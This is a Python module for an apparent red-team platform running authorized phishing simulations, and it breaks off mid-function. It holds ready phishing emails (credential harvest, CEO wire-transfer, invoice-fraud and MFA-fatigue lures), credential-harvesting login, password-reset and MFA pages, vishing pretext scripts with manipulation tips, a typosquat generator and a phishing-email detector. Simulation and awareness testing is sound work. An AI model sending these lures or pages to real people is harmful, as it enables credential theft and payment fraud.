"""Social engineering assessment engine for authorized phishing simulations."""

import asyncio
from typing import Optional, Dict, Any, List
from datetime import datetime, timedelta


class SocialEngineeringEngine:
    """Engine for social engineering assessments and authorized phishing simulations."""

    def __init__(self, db, config: dict = None):
        """Initialize the social engineering engine.

        Args:
            db: Database instance
            config: Configuration dictionary
        """
        self.db = db
        self.config = (config or {}).get("engines", {}).get("social_engineering", {})
        self.campaigns = {}  # In-memory campaign storage

    async def create_phishing_campaign(
        self,
        name: str,
        template: str,
        targets_list: List[str],
        from_name: str,
        from_email: str,
        project_id: str = None
    ) -> Dict[str, Any]:
        """Create a phishing simulation campaign (AUTHORIZED TESTING ONLY).

        Args:
            name: Campaign name
            template: Template type
            targets_list: List of target email addresses
            from_name: Sender name
            from_email: Sender email
            project_id: Project ID

        Returns:
            Dict with success status and campaign details
        """
        from core.database import generate_id, utc_now

        try:
            campaign_id = generate_id()

            campaign = {
                "campaign_id": campaign_id,
                "name": name,
                "template": template,
                "targets": targets_list,
                "from_name": from_name,
                "from_email": from_email,
                "project_id": project_id,
                "created_at": utc_now(),
                "status": "created",
                "metrics": {
                    "emails_sent": 0,
                    "emails_opened": 0,
                    "links_clicked": 0,
                    "credentials_submitted": 0,
                    "reported": 0
                },
                "target_results": {}
            }

            self.campaigns[campaign_id] = campaign

            await self.db.audit(
                action="create_phishing_campaign",
                resource_type="phishing_campaign",
                resource_id=campaign_id,
                details={
                    "name": name,
                    "template": template,
                    "target_count": len(targets_list),
                    "warning": "AUTHORIZED TESTING ONLY"
                },
                project_id=project_id
            )

            return {
                "success": True,
                "campaign_id": campaign_id,
                "name": name,
                "target_count": len(targets_list),
                "status": "created",
                "warning": "This is for authorized security testing only. Ensure proper authorization is in place."
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def list_campaigns(self, project_id: str = None) -> Dict[str, Any]:
        """List phishing campaigns for a project.

        Args:
            project_id: Project ID

        Returns:
            Dict with success status and campaigns list
        """
        try:
            campaigns_list = []

            for campaign_id, campaign in self.campaigns.items():
                if project_id and campaign.get("project_id") != project_id:
                    continue

                campaigns_list.append({
                    "campaign_id": campaign_id,
                    "name": campaign["name"],
                    "template": campaign["template"],
                    "target_count": len(campaign["targets"]),
                    "status": campaign["status"],
                    "created_at": campaign["created_at"],
                    "metrics": campaign["metrics"]
                })

            return {
                "success": True,
                "campaigns": campaigns_list,
                "count": len(campaigns_list)
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def get_campaign_results(self, campaign_id: str, project_id: str = None) -> Dict[str, Any]:
        """Get phishing campaign results.

        Args:
            campaign_id: Campaign ID
            project_id: Project ID

        Returns:
            Dict with success status and campaign results
        """
        from core.database import generate_id, utc_now

        try:
            if campaign_id not in self.campaigns:
                return {
                    "success": False,
                    "error": "Campaign not found"
                }

            campaign = self.campaigns[campaign_id]

            # Calculate rates
            total_targets = len(campaign["targets"])
            metrics = campaign["metrics"]

            open_rate = (metrics["emails_opened"] / total_targets * 100) if total_targets > 0 else 0
            click_rate = (metrics["links_clicked"] / total_targets * 100) if total_targets > 0 else 0
            credential_rate = (metrics["credentials_submitted"] / total_targets * 100) if total_targets > 0 else 0
            report_rate = (metrics["reported"] / total_targets * 100) if total_targets > 0 else 0

            result = {
                "success": True,
                "campaign_id": campaign_id,
                "name": campaign["name"],
                "status": campaign["status"],
                "total_targets": total_targets,
                "metrics": metrics,
                "rates": {
                    "open_rate": round(open_rate, 2),
                    "click_rate": round(click_rate, 2),
                    "credential_rate": round(credential_rate, 2),
                    "report_rate": round(report_rate, 2)
                },
                "target_results": campaign["target_results"]
            }

            await self.db.audit(
                action="get_campaign_results",
                resource_type="phishing_campaign",
                resource_id=campaign_id,
                details={"click_rate": round(click_rate, 2), "report_rate": round(report_rate, 2)},
                project_id=project_id
            )

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def generate_phishing_template(
        self,
        template_type: str,
        target_org: str,
        project_id: str = None
    ) -> Dict[str, Any]:
        """Generate phishing email templates.

        Args:
            template_type: Template type
            target_org: Target organization name
            project_id: Project ID

        Returns:
            Dict with success status and template content
        """
        from core.database import generate_id, utc_now

        try:
            templates = {
                "credential_harvest": {
                    "subject": f"{target_org} - Verify Your Account",
                    "text": f"""Dear {target_org} User,

We have detected unusual activity on your account. For your security, please verify your identity by logging in at the link below:

[VERIFICATION LINK]

This link will expire in 24 hours. If you do not verify your account, it may be suspended.

Thank you,
{target_org} IT Security Team
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd;">
        <h2 style="color: #d9534f;">Account Verification Required</h2>
        <p>Dear {target_org} User,</p>
        <p>We have detected unusual activity on your account. For your security, please verify your identity immediately.</p>
        <p style="text-align: center; margin: 30px 0;">
            <a href="[VERIFICATION_LINK]" style="background-color: #d9534f; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block;">
                Verify Account Now
            </a>
        </p>
        <p style="color: #999; font-size: 12px;">This link will expire in 24 hours. If you do not verify your account, it may be suspended.</p>
        <hr style="margin-top: 30px; border: none; border-top: 1px solid #ddd;">
        <p style="color: #999; font-size: 11px;">{target_org} IT Security Team</p>
    </div>
</body>
</html>
"""
                },
                "malware_download": {
                    "subject": f"{target_org} - Important Document Requires Your Attention",
                    "text": f"""Hello,

You have received an important document that requires your immediate attention.

Document: Q4_Financial_Report.pdf
Expires: 24 hours

[DOWNLOAD LINK]

Please review and acknowledge receipt.

Best regards,
{target_org} Finance Department
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd;">
        <h2 style="color: #337ab7;">Important Document</h2>
        <p>Hello,</p>
        <p>You have received an important document that requires your immediate attention.</p>
        <table style="width: 100%; margin: 20px 0; border: 1px solid #ddd;">
            <tr>
                <td style="padding: 10px; background-color: #f5f5f5;"><strong>Document:</strong></td>
                <td style="padding: 10px;">Q4_Financial_Report.pdf</td>
            </tr>
            <tr>
                <td style="padding: 10px; background-color: #f5f5f5;"><strong>Expires:</strong></td>
                <td style="padding: 10px;">24 hours</td>
            </tr>
        </table>
        <p style="text-align: center;">
            <a href="[DOWNLOAD_LINK]" style="background-color: #337ab7; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block;">
                Download Document
            </a>
        </p>
        <p style="color: #999; font-size: 12px;">Please review and acknowledge receipt.</p>
        <hr style="margin-top: 30px; border: none; border-top: 1px solid #ddd;">
        <p style="color: #999; font-size: 11px;">{target_org} Finance Department</p>
    </div>
</body>
</html>
"""
                },
                "business_email_compromise": {
                    "subject": "URGENT: Wire Transfer Authorization Needed",
                    "text": f"""I need you to process an urgent wire transfer today.

Amount: $45,000
Recipient: Vendor Services LLC
Account: [ACCOUNT DETAILS]

Please confirm you can handle this immediately. I'm in meetings all afternoon but need this completed today.

Thanks,
CEO
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
        <p style="color: #d9534f; font-weight: bold;">URGENT</p>
        <p>I need you to process an urgent wire transfer today.</p>
        <table style="margin: 20px 0;">
            <tr><td><strong>Amount:</strong></td><td>$45,000</td></tr>
            <tr><td><strong>Recipient:</strong></td><td>Vendor Services LLC</td></tr>
            <tr><td><strong>Account:</strong></td><td>[ACCOUNT DETAILS]</td></tr>
        </table>
        <p>Please confirm you can handle this immediately. I'm in meetings all afternoon but need this completed today.</p>
        <p style="margin-top: 30px;">Thanks,<br>CEO</p>
        <p style="color: #999; font-size: 10px; margin-top: 20px;">Sent from my iPhone</p>
    </div>
</body>
</html>
"""
                },
                "invoice_fraud": {
                    "subject": f"Updated Payment Information - Invoice #{generate_id()[:8]}",
                    "text": f"""Dear Accounts Payable,

Please note our banking details have been updated. All future payments should be sent to the new account below:

Bank: National Business Bank
Account: 9876543210
Routing: 021000021
Swift: NBBKUS33

Please update your records immediately and confirm receipt.

Thank you,
{target_org} Vendor Support
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd;">
        <h2 style="color: #5cb85c;">Banking Information Update</h2>
        <p>Dear Accounts Payable,</p>
        <p>Please note our banking details have been updated. All future payments should be sent to the new account below:</p>
        <table style="margin: 20px 0; border: 1px solid #ddd; width: 100%;">
            <tr style="background-color: #f5f5f5;">
                <td style="padding: 10px;"><strong>Bank:</strong></td>
                <td style="padding: 10px;">National Business Bank</td>
            </tr>
            <tr>
                <td style="padding: 10px;"><strong>Account:</strong></td>
                <td style="padding: 10px;">9876543210</td>
            </tr>
            <tr style="background-color: #f5f5f5;">
                <td style="padding: 10px;"><strong>Routing:</strong></td>
                <td style="padding: 10px;">021000021</td>
            </tr>
            <tr>
                <td style="padding: 10px;"><strong>Swift:</strong></td>
                <td style="padding: 10px;">NBBKUS33</td>
            </tr>
        </table>
        <p>Please update your records immediately and confirm receipt.</p>
        <hr style="margin-top: 30px; border: none; border-top: 1px solid #ddd;">
        <p style="color: #999; font-size: 11px;">{target_org} Vendor Support</p>
    </div>
</body>
</html>
"""
                },
                "password_reset": {
                    "subject": f"{target_org} Password Reset Request",
                    "text": f"""Hello,

A password reset was requested for your {target_org} account. If you did not make this request, please ignore this email.

To reset your password, click the link below:
[RESET_LINK]

This link expires in 1 hour.

{target_org} Support
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd;">
        <h2>Password Reset Request</h2>
        <p>Hello,</p>
        <p>A password reset was requested for your {target_org} account. If you did not make this request, please ignore this email.</p>
        <p style="text-align: center; margin: 30px 0;">
            <a href="[RESET_LINK]" style="background-color: #5cb85c; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block;">
                Reset Password
            </a>
        </p>
        <p style="color: #999; font-size: 12px;">This link expires in 1 hour.</p>
        <hr style="margin-top: 30px; border: none; border-top: 1px solid #ddd;">
        <p style="color: #999; font-size: 11px;">{target_org} Support</p>
    </div>
</body>
</html>
"""
                },
                "mfa_fatigue": {
                    "subject": f"{target_org} - Multiple Login Attempts Detected",
                    "text": f"""Security Alert,

We have detected multiple failed login attempts to your account from an unrecognized location.

Location: Moscow, Russia
IP Address: 185.220.101.23
Attempts: 15

If this was you, please approve the authentication request sent to your device. If not, change your password immediately.

{target_org} Security Team
""",
                    "html": f"""
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 2px solid #d9534f;">
        <h2 style="color: #d9534f;">Security Alert</h2>
        <p>We have detected multiple failed login attempts to your account from an unrecognized location.</p>
        <table style="width: 100%; margin: 20px 0; border: 1px solid #ddd;">
            <tr style="background-color: #f5f5f5;">
                <td style="padding: 10px;"><strong>Location:</strong></td>
                <td style="padding: 10px;">Moscow, Russia</td>
            </tr>
            <tr>
                <td style="padding: 10px;"><strong>IP Address:</strong></td>
                <td style="padding: 10px;">185.220.101.23</td>
            </tr>
            <tr style="background-color: #f5f5f5;">
                <td style="padding: 10px;"><strong>Attempts:</strong></td>
                <td style="padding: 10px;">15</td>
            </tr>
        </table>
        <p style="background-color: #fcf8e3; padding: 15px; border-left: 4px solid #f0ad4e;">
            <strong>Action Required:</strong> If this was you, please approve the authentication request sent to your device. If not, change your password immediately.
        </p>
        <hr style="margin-top: 30px; border: none; border-top: 1px solid #ddd;">
        <p style="color: #999; font-size: 11px;">{target_org} Security Team</p>
    </div>
</body>
</html>
"""
                }
            }

            if template_type not in templates:
                return {
                    "success": False,
                    "error": f"Unknown template type. Available: {', '.join(templates.keys())}"
                }

            template = templates[template_type]

            await self.db.audit(
                action="generate_phishing_template",
                resource_type="phishing_template",
                resource_id=template_type,
                details={"template_type": template_type, "target_org": target_org},
                project_id=project_id
            )

            return {
                "success": True,
                "template_type": template_type,
                "subject": template["subject"],
                "text_version": template["text"],
                "html_version": template["html"],
                "placeholders": ["[VERIFICATION_LINK]", "[DOWNLOAD_LINK]", "[RESET_LINK]", "[ACCOUNT_DETAILS]"],
                "warning": "For authorized security testing only"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def analyze_phishing_email(
        self,
        email_headers: str,
        email_body: str,
        project_id: str = None
    ) -> Dict[str, Any]:
        """Analyze a suspicious email for phishing indicators.

        Args:
            email_headers: Email headers
            email_body: Email body content
            project_id: Project ID

        Returns:
            Dict with success status and analysis results
        """
        from core.database import generate_id, utc_now
        import re
        from urllib.parse import urlparse

        try:
            indicators = []
            risk_score = 0

            # Parse headers
            from_match = re.search(r'From:(.+)', email_headers)
            from_header = from_match.group(1).strip() if from_match else ""

            # Check sender reputation (basic checks)
            if re.search(r'@gmail\.com|@yahoo\.com|@outlook\.com|@hotmail\.com', from_header, re.IGNORECASE):
                indicators.append({
                    "type": "sender_reputation",
                    "severity": "medium",
                    "description": "Email sent from free email provider (unusual for corporate communications)"
                })
                risk_score += 20

            # URL analysis
            urls = re.findall(r'https?://[^\s<>"]+', email_body)
            suspicious_urls = []

            for url in urls:
                parsed = urlparse(url)
                domain = parsed.netloc

                # Check for IP addresses
                if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', domain):
                    suspicious_urls.append({
                        "url": url,
                        "reason": "Uses IP address instead of domain name"
                    })
                    risk_score += 30

                # Check for suspicious TLDs
                suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top']
                if any(domain.endswith(tld) for tld in suspicious_tlds):
                    suspicious_urls.append({
                        "url": url,
                        "reason": "Uses suspicious top-level domain"
                    })
                    risk_score += 25

                # Check for URL shorteners
                shorteners = ['bit.ly', 'tinyurl.com', 'goo.gl', 't.co']
                if any(s in domain for s in shorteners):
                    suspicious_urls.append({
                        "url": url,
                        "reason": "Uses URL shortener (hides destination)"
                    })
                    risk_score += 15

            if suspicious_urls:
                indicators.append({
                    "type": "url_analysis",
                    "severity": "high",
                    "description": f"Found {len(suspicious_urls)} suspicious URLs",
                    "urls": suspicious_urls
                })

            # Check for urgency language
            urgency_keywords = [
                'urgent', 'immediate', 'action required', 'expires', 'suspended',
                'verify now', 'act now', 'limited time', 'final notice'
            ]
            urgency_found = [kw for kw in urgency_keywords if kw in email_body.lower()]

            if len(urgency_found) >= 2:
                indicators.append({
                    "type": "urgency_language",
                    "severity": "medium",
                    "description": f"Multiple urgency keywords detected: {', '.join(urgency_found)}"
                })
                risk_score += 15

            # Check for requests for sensitive information
            sensitive_keywords = [
                'password', 'social security', 'ssn', 'credit card',
                'bank account', 'pin', 'credentials', 'verify account'
            ]
            sensitive_found = [kw for kw in sensitive_keywords if kw in email_body.lower()]

            if sensitive_found:
                indicators.append({
                    "type": "sensitive_data_request",
                    "severity": "critical",
                    "description": f"Requests sensitive information: {', '.join(sensitive_found)}"
                })
                risk_score += 40

            # Check for poor grammar/spelling
            grammar_issues = []
            if re.search(r'dear customer|dear user|dear valued', email_body, re.IGNORECASE):
                grammar_issues.append("Generic greeting (not personalized)")
            if re.search(r'\s{2,}', email_body):
                grammar_issues.append("Multiple consecutive spaces")

            if grammar_issues:
                indicators.append({
                    "type": "grammar_spelling",
                    "severity": "low",
                    "description": "Potential grammar/formatting issues detected",
                    "issues": grammar_issues
                })
                risk_score += 10

            # Calculate risk level
            if risk_score >= 70:
                risk_level = "critical"
            elif risk_score >= 50:
                risk_level = "high"
            elif risk_score >= 30:
                risk_level = "medium"
            else:
                risk_level = "low"

            result = {
                "success": True,
                "risk_level": risk_level,
                "risk_score": min(risk_score, 100),
                "indicators": indicators,
                "indicator_count": len(indicators),
                "urls_found": len(urls),
                "suspicious_urls": len(suspicious_urls),
                "recommendation": self._get_phishing_recommendation(risk_level)
            }

            await self.db.audit(
                action="analyze_phishing_email",
                resource_type="email",
                resource_id=generate_id(),
                details={"risk_level": risk_level, "risk_score": risk_score},
                project_id=project_id
            )

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _get_phishing_recommendation(self, risk_level: str) -> str:
        """Get recommendation based on risk level."""
        recommendations = {
            "critical": "DO NOT interact with this email. Delete immediately and report to security team.",
            "high": "Likely phishing attempt. Do not click links or provide information. Report to security team.",
            "medium": "Exercise caution. Verify sender through alternate means before taking any action.",
            "low": "Email appears legitimate but verify sender if requesting sensitive actions."
        }
        return recommendations.get(risk_level, "Unknown risk level")

    async def check_typosquatting(self, domain: str, project_id: str = None, target_id: str = None) -> Dict[str, Any]:
        """Generate typosquat variations and check which are registered.

        Args:
            domain: Domain to check
            project_id: Project ID
            target_id: Target ID

        Returns:
            Dict with success status and typosquatting results
        """
        from core.database import generate_id, utc_now
        import dns.resolver

        try:
            # Remove TLD for manipulation
            parts = domain.rsplit('.', 1)
            if len(parts) != 2:
                return {
                    "success": False,
                    "error": "Invalid domain format"
                }

            base_name, tld = parts

            variations = set()

            # Bitsquatting (flip one bit in ASCII)
            for i, char in enumerate(base_name):
                ascii_val = ord(char)
                for bit in range(8):
                    flipped = chr(ascii_val ^ (1 << bit))
                    if flipped.isalnum() or flipped == '-':
                        variations.add(base_name[:i] + flipped + base_name[i+1:])

            # Homoglyphs (visually similar characters)
            homoglyphs = {
                'a': ['@'],
                'o': ['0'],
                'i': ['1', 'l'],
                'l': ['1', 'i'],
                'e': ['3'],
                's': ['5', '$'],
                'g': ['9'],
                'b': ['8']
            }

            for i, char in enumerate(base_name):
                if char.lower() in homoglyphs:
                    for replacement in homoglyphs[char.lower()]:
                        variations.add(base_name[:i] + replacement + base_name[i+1:])

            # Insertion (add character)
            common_chars = 'abcdefghijklmnopqrstuvwxyz0123456789-'
            for i in range(len(base_name) + 1):
                for char in common_chars:
                    variations.add(base_name[:i] + char + base_name[i:])

            # Omission (remove character)
            for i in range(len(base_name)):
                variations.add(base_name[:i] + base_name[i+1:])

            # Transposition (swap adjacent characters)
            for i in range(len(base_name) - 1):
                variations.add(base_name[:i] + base_name[i+1] + base_name[i] + base_name[i+2:])

            # Addition (add common suffix/prefix)
            additions = ['-', '1', '2', 'app', 'secure', 'login', 'mail', 'support']
            for add in additions:
                variations.add(base_name + add)
                variations.add(add + base_name)

            # Limit variations to avoid too many DNS queries
            variations = list(variations)[:200]

            # Check which domains are registered
            registered = []
            for variation in variations:
                if variation == base_name or not variation:
                    continue

                typosquat_domain = f"{variation}.{tld}"

                try:
                    # Try to resolve domain
                    answers = dns.resolver.resolve(typosquat_domain, 'A')
                    if answers:
                        registered.append({
                            'domain': typosquat_domain,
                            'variation_type': self._get_variation_type(base_name, variation),
                            'ip_addresses': [str(rdata) for rdata in answers]
                        })
                except:
                    # Domain not registered or no A record
                    pass

            result = {
                "success": True,
                "original_domain": domain,
                "variations_checked": len(variations),
                "registered_count": len(registered),
                "registered_domains": registered,
                "risk_assessment": "High risk" if len(registered) > 10 else "Medium risk" if len(registered) > 0 else "Low risk"
            }

            await self.db.audit(
                action="check_typosquatting",
                resource_type="domain",
                resource_id=domain,
                details={"variations_checked": len(variations), "registered_count": len(registered)},
                project_id=project_id
            )

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "domain": domain
            }

    def _get_variation_type(self, original: str, variation: str) -> str:
        """Determine the type of domain variation."""
        if len(variation) < len(original):
            return "omission"
        elif len(variation) > len(original):
            return "insertion/addition"
        else:
            # Check if it's transposition
            for i in range(len(original) - 1):
                if original[:i] + original[i+1] + original[i] + original[i+2:] == variation:
                    return "transposition"
            return "substitution/homoglyph"

    async def create_landing_page(
        self,
        page_type: str,
        target_org: str,
        project_id: str = None
    ) -> Dict[str, Any]:
        """Generate credential harvesting landing page templates (AUTHORIZED TESTING ONLY).

        Args:
            page_type: Type of landing page
            target_org: Target organization name
            project_id: Project ID

        Returns:
            Dict with success status and HTML template
        """
        from core.database import generate_id, utc_now

        try:
            pages = {
                "login_page": f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_org} - Sign In</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; }}
        .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; margin-bottom: 30px; text-align: center; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background-color: #45a049; }}
        .error {{ color: red; display: none; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{target_org}</h1>
        <h2>Sign In</h2>
        <form id="loginForm" action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <div class="error" id="error">Invalid credentials. Please try again.</div>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            // In real implementation, this would send to capture endpoint
            document.getElementById('error').style.display = 'block';
        }});
    </script>
</body>
</html>
""",
                "password_reset": f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_org} - Reset Password</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; }}
        .container {{ max-width: 500px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; margin-bottom: 20px; }}
        p {{ color: #666; line-height: 1.6; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background-color: #2196F3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background-color: #0b7dda; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Reset Your Password</h1>
        <p>Enter your current password and new password below.</p>
        <form id="resetForm" action="/capture" method="POST">
            <input type="password" name="current_password" placeholder="Current Password" required>
            <input type="password" name="new_password" placeholder="New Password" required>
            <input type="password" name="confirm_password" placeholder="Confirm New Password" required>
            <button type="submit">Reset Password</button>
        </form>
    </div>
</body>
</html>
""",
                "mfa_prompt": f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_org} - Two-Factor Authentication</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; }}
        .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }}
        h1 {{ color: #333; margin-bottom: 20px; }}
        p {{ color: #666; margin-bottom: 30px; }}
        input {{ width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; text-align: center; font-size: 24px; letter-spacing: 10px; }}
        button {{ width: 80%; padding: 12px; background-color: #FF5722; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }}
        button:hover {{ background-color: #E64A19; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Verification Required</h1>
        <p>Please enter the 6-digit code from your authenticator app.</p>
        <form id="mfaForm" action="/capture" method="POST">
            <input type="text" name="mfa_code" placeholder="000000" maxlength="6" pattern="[0-9]{{6}}" required>
            <button type="submit">Verify</button>
        </form>
        <p style="margin-top: 30px; font-size: 12px; color: #999;">Multiple requests detected. Please approve to continue.</p>
    </div>
</body>
</html>
""",
                "document_viewer": f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_org} - Secure Document Viewer</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; }}
        .header {{ background-color: #333; color: white; padding: 20px; text-align: center; }}
        .container {{ max-width: 600px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .document-icon {{ font-size: 64px; text-align: center; margin: 20px 0; }}
        h2 {{ color: #333; text-align: center; }}
        p {{ color: #666; text-align: center; margin: 20px 0; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background-color: #45a049; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>{target_org} Secure Documents</h1>
    </div>
    <div class="container">
        <div class="document-icon">📄</div>
        <h2>Q4_Financial_Report.pdf</h2>
        <p>This document is password protected. Please enter your credentials to view.</p>
        <form id="docForm" action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Open Document</button>
        </form>
    </div>
</body>
</html>
"""
            }

            if page_type not in pages:
                return {
                    "success": False,
                    "error": f"Unknown page type. Available: {', '.join(pages.keys())}"
                }

            await self.db.audit(
                action="create_landing_page",
                resource_type="landing_page",
                resource_id=page_type,
                details={"page_type": page_type, "target_org": target_org},
                project_id=project_id
            )

            return {
                "success": True,
                "page_type": page_type,
                "html": pages[page_type],
                "warning": "For authorized security testing only. Deploy only in controlled environments."
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def generate_pretext(
        self,
        scenario: str,
        target_role: str,
        project_id: str = None
    ) -> Dict[str, Any]:
        """Generate social engineering pretexts for vishing/in-person scenarios.

        Args:
            scenario: Scenario type
            target_role: Target's role
            project_id: Project ID

        Returns:
            Dict with success status and pretext details
        """
        from core.database import generate_id, utc_now

        try:
            pretexts = {
                "IT_support": {
                    "scenario": "IT Support Password Reset",
                    "role": "IT Help Desk Technician",
                    "script": f"""
Hello, this is [Name] from IT Support. We're performing routine security updates and need to verify your account.

I see you're a {target_role}. We've detected some unusual activity on your account and need to reset your password as a precaution.

Can you confirm your employee ID and current email address for me?

[Wait for response]

Great, thanks. I'm going to send you a password reset link. When you receive it, please click it immediately and create a new password. Make sure it's at least 12 characters with a mix of letters, numbers, and symbols.

Do you have any questions about the process?
""",
                    "key_points": [
                        "Establish urgency (security updates)",
                        "Use company jargon (employee ID)",
                        "Sound helpful and professional",
                        "Don't directly ask for password"
                    ]
                },
                "vendor_inquiry": {
                    "scenario": "Vendor/Supplier Inquiry",
                    "role": "Vendor Representative",
                    "script": f"""
Hi, this is [Name] from [Vendor Company]. I'm following up on our recent invoice for the services provided last month.

Our records show the payment is overdue, and our banking information may have changed. I wanted to verify we have the correct contact for your accounts payable department.

Are you the right person to handle this, or should I speak with someone in {target_role} team?

[Wait for response]

Perfect. Could you provide the best email to send the updated invoice and banking details? We want to make sure this gets processed quickly.
""",
                    "key_points": [
                        "Use legitimate business concern",
                        "Reference vague past interactions",
                        "Ask to be directed to correct person",
                        "Gather contact information"
                    ]
                },
                "executive_request": {
                    "scenario": "Executive Request",
                    "role": "Executive Assistant",
                    "script": f"""
Hello, I'm calling on behalf of [Executive Name], our [Title]. They're currently in back-to-back meetings but asked me to reach out urgently.

We need to process a time-sensitive vendor payment today, and [Executive] mentioned you as the {target_role} who could help expedite this.

Do you have a moment to help us with this? It's quite urgent as the vendor needs confirmation by end of business today.

[Wait for response]

Excellent, thank you. I'll send you the details via email right now. [Executive] really appreciates your quick response on this.
""",
                    "key_points": [
                        "Invoke authority (executive name)",
                        "Create time pressure",
                        "Make target feel important/helpful",
                        "Use follow-up via email for payload"
                    ]
                },
                "delivery": {
                    "scenario": "Package Delivery",
                    "role": "Delivery Courier",
                    "script": f"""
Hi, this is [Name] from [Delivery Company]. I have a package here for your office, but there's an issue with the delivery authorization.

The package is marked as containing sensitive documents, and I need verbal confirmation from a {target_role} before I can leave it at reception.

Can you confirm your full name and department for the delivery log?

[Wait for response]

Also, the sender has requested signature upon delivery. I'll need you to come down to the lobby to sign for it, or I can leave it with security if you provide your employee ID number for verification.
""",
                    "key_points": [
                        "Create sense of physical presence",
                        "Use official-sounding procedures",
                        "Request identifying information",
                        "Offer alternative (still requires info)"
                    ]
                },
                "survey": {
                    "scenario": "Employee Survey/Research",
                    "role": "Research Analyst",
                    "script": f"""
Good morning/afternoon, my name is [Name] and I'm conducting a brief workplace satisfaction survey for [Company/Third Party].

We're specifically interested in feedback from {target_role} positions to better understand your daily technology needs and challenges.

This should only take 3-5 minutes. All responses are confidential. Can I ask you a few quick questions?

[Wait for response]

Great! First, what operating system do you primarily use? Windows, Mac, or Linux?

And what's your main method of accessing company systems? VPN, direct connection, or cloud-based?

Do you use any third-party tools or applications for your work that aren't officially provided by IT?
""",
                    "key_points": [
                        "Seem innocuous and helpful",
                        "Gather technical information",
                        "Build rapport before sensitive questions",
                        "Claim confidentiality to encourage openness"
                    ]
                }
            }

            if scenario not in pretexts:
                return {
                    "success": False,
                    "error": f"Unknown scenario. Available: {', '.join(pretexts.keys())}"
                }

            pretext = pretexts[scenario]

            await self.db.audit(
                action="generate_pretext",
                resource_type="social_engineering_pretext",
                resource_id=scenario,
                details={"scenario": scenario, "target_role": target_role},
                project_id=project_id
            )

            return {
                "success": True,
                "scenario": pretext["scenario"],
                "assumed_role": pretext["role"],
                "target_role": target_role,
                "script": pretext["script"],
                "key_points": pretext["key_points"],
                "warning": "For authorized security testing only. Obtain proper authorization before conducting social engineering assessments."
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def assess_awareness(self, project_id: str) -> Dict[str, Any]:
        """Assess security awareness based on campaign results.

        Args:
            project_id: Project ID

        Returns:
            Dict with success status and awareness assessment
        """
        from core.database import generate_id, utc_now

        try:
